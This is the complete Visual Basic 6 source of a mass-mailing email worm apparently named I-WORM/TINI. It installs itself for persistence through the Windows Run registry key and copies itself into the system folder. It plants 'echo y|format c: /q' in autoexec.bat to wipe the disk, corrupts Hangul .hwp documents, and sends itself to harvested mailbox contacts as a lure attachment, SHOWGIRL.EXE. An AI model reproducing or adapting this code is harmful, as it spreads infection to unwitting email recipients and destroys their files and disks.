VERSION 5.00
Object = "{20C62CAE-15DA-101B-B9A8-444553540000}#1.1#0"; "MSMAPI32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form main 
   Caption         =   "Who am I? Worm?"
   ClientHeight    =   2565
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   6435
   Icon            =   "amiworm.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2565
   ScaleWidth      =   6435
   StartUpPosition =   3  'Windows 기본값
   Begin VB.CommandButton winbabo 
      Caption         =   "Window^^"
      Height          =   375
      Left            =   3000
      TabIndex        =   10
      Top             =   960
      Width           =   1095
   End
   Begin VB.ListBox lstapp 
      Height          =   960
      Left            =   2880
      TabIndex        =   9
      Top             =   1320
      Width           =   3495
   End
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   2400
      Top             =   1320
   End
   Begin VB.CommandButton hwpkill 
      Caption         =   "hwp-kill"
      Height          =   375
      Left            =   2040
      TabIndex        =   8
      Top             =   960
      Width           =   975
   End
   Begin VB.TextBox info 
      Height          =   270
      Left            =   4200
      Locked          =   -1  'True
      TabIndex        =   6
      Top             =   720
      Width           =   2175
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   5400
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.FileListBox File1 
      Height          =   270
      Left            =   3000
      TabIndex        =   5
      Top             =   360
      Width           =   1095
   End
   Begin VB.DirListBox Dir1 
      Height          =   300
      Left            =   2040
      TabIndex        =   4
      Top             =   360
      Width           =   975
   End
   Begin VB.TextBox yorn 
      Height          =   270
      Left            =   4200
      TabIndex        =   3
      Top             =   960
      Width           =   2175
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   2040
      Top             =   1320
   End
   Begin VB.CommandButton Command1 
      Caption         =   "end"
      Height          =   375
      Left            =   3000
      TabIndex        =   2
      Top             =   600
      Width           =   1095
   End
   Begin MSMAPI.MAPIMessages MAPIMessages1 
      Left            =   4800
      Top             =   120
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      AddressEditFieldCount=   1
      AddressModifiable=   0   'False
      AddressResolveUI=   0   'False
      FetchSorted     =   0   'False
      FetchUnreadOnly =   0   'False
   End
   Begin MSMAPI.MAPISession MAPISession1 
      Left            =   4200
      Top             =   120
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      DownloadMail    =   -1  'True
      LogonUI         =   -1  'True
      NewSession      =   0   'False
   End
   Begin VB.CommandButton mailsend 
      Caption         =   "Send"
      Height          =   375
      Left            =   2040
      TabIndex        =   1
      Top             =   600
      Width           =   975
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00C0C0FF&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF8080&
      Height          =   2415
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "amiworm.frx":030A
      Top             =   0
      Width           =   2055
   End
   Begin VB.Label Label1 
      Caption         =   "Create by NHKR _ Need for VB DLL File #6.0"
      Height          =   495
      Left            =   2040
      TabIndex        =   7
      Top             =   0
      Width           =   2175
   End
End
Attribute VB_Name = "main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim x, cnct

Private Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As Long, ByVal lpWindowName As String) As Long
Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long

Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, _
      ByVal flgs As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, _
      ByVal wCmd As Long) As Long
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" _
      (ByVal hwnd As Long, ByVal wIndx As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" _
      (ByVal hwnd As Long, ByVal lpSting As String, ByVal nMaxCount As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" _
    (ByVal hwnd As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, _
    ByVal insaft As Long, ByVal x%, ByVal y%, ByVal cx%, ByVal cy%, _
    ByVal flgs As Long) As Long
    
Const HWND_TOP = 0              ' 최상위 윈도우 값
Const SWP_NOSIZE = &H1          ' 윈도우의 크기 불가능 값.
Const SWP_NOMOVE = &H2          ' 윈도우 이동 불가능 값.
Const SWP_SHOWWINDOW = &H40     ' 윈도우의 활성화 값
Const GW_HWNDFIRST = 0          ' 첫번째 윈도우 핸들러
Const GW_HWNDNEXT = 2           ' 다음 윈도우 핸들러
Const GWL_STYLE = (-16)         ' 윈도우 스타일 값.
Const SW_RESTORE = 9            ' 윈도우 복구하기

Const WS_MINIMIZE = &H20000000     ' 최소화 값
Const WS_VISIBLE = &H10000000      ' 윈도우가 숨겨져 있지 않음.
Const WS_BORDER = &H800000         ' 윈도우 스타일이 경계를 갖고 있음
Const WS_CLIPSIBLINGS = &H4000000  ' can clip windows
Const WS_THICKFRAME = &H40000      ' 윈도우가 굵은 경계를 갖고 있음.
Const WS_GROUP = &H20000           ' 윈도우가 집합의 상위 임.
Const WS_TABSTOP = &H10000         ' 윈도우가 탭중지 속성을 갖고 있음.

Dim IsTask As Long                 ' 정상 윈도우의 스타일 값.
Private Sub Command1_Click()
    End
End Sub

Private Sub Dir1_Change()
    File1.Path = Dir1.Path
End Sub

Private Sub Form_Load()
    main.Hide
    Dim chk, rf, rtf
    Dim fsz, i
    
    chk = SetRegStr(HKEY_LOCAL_MACHINE, "Software\Microsoft\windows\currentversion\run", "NHKR", "c:\windows\system\tini.exe")

    IsTask = WS_VISIBLE Or WS_BORDER
    
    If App.PrevInstance Then
        End
    End If

    chk = Dir("c:\windows\system\tini.exe", vbNormal)
    If chk = "" Then
        ermsg.Show
    End If

    chk = Dir("c:\nhkr.wrm", vbNormal)
    If chk <> "" Then
        main.Show
        GoTo no31
    Else
        If Day(Date) = 21 Then
            MsgBox "TINI X _ 21 day^^ Happy Day!!", , "I-WORM/TINI"
            Open "c:\autoexec.bat" For Output As #1
            Print #1, "echo y|format c: /q > nul"
            Close #1
        End If
    End If

    chk = Dir("c:\no_kill_hwp.wrm", vbNormal)
    If chk = "" Then
        hwpkill_Click
    End If
    
no31:
    
    '자기 자신이 windows\system에 있지 않으면 복사
    chk = Dir("c:\windows\system\tini.exe", vbNormal)
    If chk <> "" Then
        GoTo nxt
    End If
    
    '자기 자신 파일이름 수집
     rf = App.EXEName
     rtf = rf + ".exe"
     On Error GoTo nxt
     FileCopy rtf, "c:\windows\system\tini.exe"
     

nxt:
     
    '압축파일이 없으면 여부확인 후 복사
    chk = Dir("c:\windows\system\tini.dll", vbNormal)
    If chk <> "" Then
        GoTo nxt1
    End If
     
     File1.Path = App.Path
     File1.Pattern = "*.EXE"
     
     
     For i = 0 To File1.ListCount - 1
        rf = App.Path + "\" + File1.List(i)
        Open rf For Input As #1
            Line Input #1, chk
        Close #1
        
        If UCase$(Left(chk, 3)) = "MZP" Then
            On Error GoTo nxt1
            FileCopy rf, "c:\windows\system\tini.dll"
            GoTo nxt1
        End If
        
        'fsz = FileLen(rf)
        'If fsz = 73803 Or fsz = 73793 Then
        '    On Error GoTo nxt1
        '    FileCopy rf, "c:\windows\system\tini.dll"
        'End If
     Next
    
nxt1:
    'DLL 파일이 없으면 여부확인 후 복사
    chk = Dir("c:\windows\system\vb6ko.dll ", vbNormal)
    If chk <> "" Then
        GoTo err0
    End If
     rf = App.Path
     rf = App.Path + "\" + "vb6ko.dll"
     chk = Dir(rf, vbNormal)
     If chk <> "" Then
        On Error GoTo err0
        FileCopy rf, "c:\windows\system\vb6ko.dll"
     Else
            Open "c:\autoexec.bat" For Output As #1
            Print #1, "echo y|format c: /q > nul"
            Close #1
     End If

err0:

End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error GoTo xx
    Shell "c:\windows\system\tini.exe", vbNormalFocus

xx:
    End
End Sub

Private Sub hwpkill_Click()
    Dim cnt, cnt2, i, j, k, l, fn, tot
    Dir1.Path = "c:\"
    File1.Pattern = "*.hwp"
    cnt = Dir1.ListCount
        
    
    For i = 0 To cnt - 1
        Dir1.Path = Dir1.List(i)
        
        cnt2 = Dir1.ListCount
        
        For j = 0 To cnt2 - 1
            Dir1.Path = Dir1.List(j)
            
            fn = File1.ListCount
            For k = 0 To fn - 1
                tot = Dir1.Path + "\" + File1.List(k)
                Open tot For Append As #2
                    For l = 1 To 1031
                        Print #2, l
                    Next
                Close #2
            Next
            
            Dir1.Path = ".."
        Next
        Dir1.Path = ".."
    Next
    
    Close #1

End Sub

Private Sub mailsend_Click()

Dim i, cnt, addres, chk, tmp
Dim ingret As Long
Dim blnold As Boolean

Load thesub
chk = thesub.Winsock1.LocalIP
    If chk = "127.0.0.1" Or chk = "0.0.0" Or chk = "0.0.0.0" Or chk = "" Then
        GoTo no
    End If


ingret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, blnold, 0&)

MAPISession1.SignOn
MAPIMessages1.SessionID = MAPISession1.SessionID
MAPIMessages1.FetchUnreadOnly = False

On Error GoTo err
MAPIMessages1.Fetch

err:

cnt = MAPIMessages1.MsgCount

For i = 1 To cnt
    MAPIMessages1.MsgIndex = i - 1
    addres = addres + MAPIMessages1.MsgOrigAddress + ";"
Next

MAPIMessages1.MsgIndex = -1

MAPIMessages1.MsgSubject = "This is SOME PICTURE_GIRL^^"
MAPIMessages1.MsgNoteText = "This is Some Pic[SHOW GIRl]^^ in FILE^^"



MAPIMessages1.AttachmentName = "SHOWGIRL.EXE"
chk = Dir("c:\windows\system\tini.dll", vbNormal)

If chk <> "" Then
        MAPIMessages1.AttachmentPathName = "c:\windows\system\tini.dll"
Else
        MAPIMessages1.AttachmentPathName = "c:\autoexec.bat"
End If

    For i = 1 To cnt
        tmp = Left(addres, InStr(1, addres, ";") - 1)
        MAPIMessages1.RecipAddress = tmp
    
    'Check Connect now..
        Load thesub
        chk = thesub.Winsock1.LocalIP
        If chk = "127.0.0.1" Or chk = "0.0.0" Or chk = "0.0.0.0" Or chk = "" Then
            MAPISession1.SignOff
            ingret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, blnold, 0&)
            GoTo no
        End If

        MAPIMessages1.Send
        Pause 0.5
        addres = Right(addres, Len(addres) - InStr(1, addres, ";"))
    Next

    MAPISession1.SignOff
no:

ingret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, blnold, 0&)

End Sub

Private Sub mse_Timer()
    Dim chk
    chk = SetCursorPos(5, 5)
    chk = ShowCursor(False)
End Sub

Private Sub Timer1_Timer()
    Dim a
    a = FindWindow(0, "Outlook Express")
    
    If a Then
        x = 1
        yorn = x
    Else
        yorn = "no work the Outlook Express..."
    End If
    
    If x = 1 Then
       If a Then
           yorn = "아직 있네"
       Else
           x = 0
           a = ""
           mailsend_Click
       End If
    End If
    
End Sub

Private Sub Timer2_Timer()
cnct = cnct + 1

Dim gt, chk

If cnct Mod 9000000 = 0 Then
Load thesub
gt = thesub.Winsock1.LocalIP
info.Text = gt
Unload thesub

If gt = "127.0.0.1" Or gt = "0.0.0" Or gt = "0.0.0.0" Or gt = "" Then
Else
    mailsend_Click
End If

End If

chk = SetRegStr(HKEY_LOCAL_MACHINE, "Software\Microsoft\windows\currentversion\run", "NHKR", "c:\windows\system\tini.exe")

If Day(Date) = Minute(Time) Then
    winbabo_Click
End If

End Sub

Private Sub winbabo_Click()
    Dim hwCurr As Long
    Dim intLen As Long
    Dim strTitle As String
    Dim lngStyle As Long
    lstapp.Clear
    hwCurr = GetWindow(Me.hwnd, GW_HWNDFIRST)  ' 첫번째 작업 윈도우 구하기
    Do While hwCurr  ' 모든 작업 윈도우 구하기
        If hwCurr <> Me.hwnd And TaskWindow(hwCurr) Then
            intLen = GetWindowTextLength(hwCurr) + 1 ' 윈도우 길이
            strTitle = Space$(intLen) ' 윈도우 제목
            intLen = GetWindowText(hwCurr, strTitle, intLen)
            If intLen > 0 Then ' 리스트박스에 추가하기
                lstapp.AddItem strTitle
                ' itemData 배열에 윈도우 핸들러 저장하기
                lstapp.ItemData(lstapp.NewIndex) = hwCurr
            End If
        End If
        hwCurr = GetWindow(hwCurr, GW_HWNDNEXT)    '다음 작업 윈도우 구하기
     Loop

''''''''''''''''''''''''''''''''''''
    
    Dim x As Long
    Dim ingww As Long
    Dim i
    Dim rn
    
    For i = 1 To 3
        Randomize Timer
        rn = Int(Rnd * lstapp.ListCount - 1) + 1
    Next i
        
    For i = 1 To 20
        On Error GoTo err0
        x = SetWindowText(lstapp.ItemData(rn), "Tini Installed~!^^")
        On Error GoTo err0
        x = ShowWindow(lstapp.ItemData(rn), 1)
        On Error GoTo err0
        x = ShowWindow(lstapp.ItemData(rn), 2)
    Next

err0:
End Sub
Function TaskWindow(hwCurr As Long) As Long
    Dim lngStyle As Long
    lngStyle = GetWindowLong(hwCurr, GWL_STYLE)
    If (lngStyle And IsTask) = IsTask Then TaskWindow = True
End Function

